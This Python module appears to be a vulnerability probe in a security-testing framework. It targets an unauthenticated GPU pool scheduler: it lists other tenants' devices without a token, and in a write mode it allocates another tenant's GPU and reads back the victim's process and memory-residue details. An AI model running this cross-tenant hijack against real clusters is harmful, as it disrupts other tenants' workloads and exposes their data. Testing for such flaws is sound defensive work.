"""GPU 池调度 admin 无鉴权 — 池清单跨租户可见 + 任意分配/迁移。

检测面：GET /gpu/pools（无 token）返回全租户设备 → 泄露；backup-write 下
POST /gpu/allocate 以 tenant-a 身份占用 tenant-b 已分配设备（迁移）→ 200 即跨租户调度成功。
fixed：池清单按 X-Tenant 过滤；写操作要求平台 admin token + 同租户设备（403/409）。
"""
from __future__ import annotations

import sys
from pathlib import Path

_REPO = Path(__file__).resolve().parents[3]
if str(_REPO) not in sys.path:
    sys.path.insert(0, str(_REPO))

from trident.modules._gpu_cloud_common import (  # noqa: E402
    Trace, base_url, benign_marker, detail, ok, read_headers, resolve_mode, resp, write_headers,
)

KEY = "gpu-pool-scheduler-unauth"
WRITES = True


def run(ctx: dict, params: dict) -> dict:
    base = base_url(params)
    mode, note = resolve_mode(params, WRITES)
    if not base:
        return {"summary": "no-target", "artifacts": [], "findings": []}
    tenant = str(params.get("tenant") or "tenant-a")
    victim = str(params.get("victim_tenant") or "tenant-b")
    device_name = str(params.get("device") or "gpu-b-0")
    marker = benign_marker(ctx, "SCHED")
    t = Trace(ctx, KEY)
    findings: list[dict] = []

    pools = t.call("GET", f"{base}/gpu/pools", headers=read_headers(params))
    pool_payload = resp(pools)
    devices = pool_payload.get("devices") or []
    tenants = sorted({str(d.get("tenant", "")) for d in devices if d.get("tenant")})
    cross_visible = bool(pool_payload.get("cross_tenant_visible")) or len(tenants) > 1
    if ok(pools) and cross_visible:
        findings.append({
            "sev": "medium",
            "title": "GPU 池清单无鉴权跨租户可见（设备/租户/MIG 档位）",
            "detail": detail({
                "route": "/gpu/pools",
                "http_status": pools.get("status"),
                "auth": "none",
                "tenants": tenants,
                "devices": [d.get("device") for d in devices],
                "device_count": len(devices),
                "note": "池化调度面未鉴权：攻击者可枚举他租户设备、MIG 档位与分配状态",
            }),
        })

    allocation = {}
    release = {}
    if mode == "backup-write":
        allocation = t.call("POST", f"{base}/gpu/allocate", {
            "tenant": tenant,
            "device": device_name,
            "namespace": str(params.get("namespace") or f"ns-{tenant}-infer"),
            "mig_profile": str(params.get("mig_profile") or "1g.10gb"),
            "mps": True,
            "marker": marker,
            "process": f"trident-{tenant}",
        }, headers=write_headers(params))
        alloc_payload = resp(allocation)
        if ok(allocation):
            cross = bool(alloc_payload.get("cross_tenant") or alloc_payload.get("migrated"))
            findings.append({
                "sev": "high" if cross else "medium",
                "title": ("GPU 池调度 admin 无鉴权：跨租户分配/迁移成功"
                          if cross else "GPU 池调度分配被接受（无鉴权）"),
                "detail": detail({
                    "route": "/gpu/allocate",
                    "http_status": allocation.get("status"),
                    "auth": "none",
                    "tenant": tenant,
                    "device": device_name,
                    "cross_tenant": cross,
                    "previous_tenant": alloc_payload.get("previous_tenant", ""),
                    "previous_process": alloc_payload.get("previous_process", ""),
                    "previous_residue": alloc_payload.get("previous_residue", False),
                    "allocation_id": alloc_payload.get("allocation_id", ""),
                    "residue_sha256": alloc_payload.get("residue_sha256", ""),
                    "state_sha256": alloc_payload.get("state_sha256", ""),
                    "note": "旧分配被直接迁移且残留保留：受害者进程/显存快照暴露给攻击租户",
                }),
            })
            release = t.call("POST", f"{base}/gpu/release", {
                "tenant": tenant,
                "allocation_id": alloc_payload.get("allocation_id", ""),
            }, headers=write_headers(params))
            if ok(release) and resp(release).get("residue_retained"):
                findings.append({
                    "sev": "medium",
                    "title": "GPU 释放后残留保留（可继续读取显存快照）",
                    "detail": detail({
                        "route": "/gpu/release",
                        "http_status": release.get("status"),
                        "allocation_id": alloc_payload.get("allocation_id", ""),
                        "residue_retained": True,
                        "residue_sha256": resp(release).get("residue_sha256", ""),
                    }),
                })

    artifact = t.dump()
    summary = (f"pools={pools.get('status')} 跨租户可见={str(cross_visible).lower()} "
               f"allocate={allocation.get('status', '-')} release={release.get('status', '-')} "
               f"findings={len(findings)} mode={mode}")
    if note:
        summary += f"；{note}"
    return {"summary": summary, "artifacts": [str(artifact)], "findings": findings}
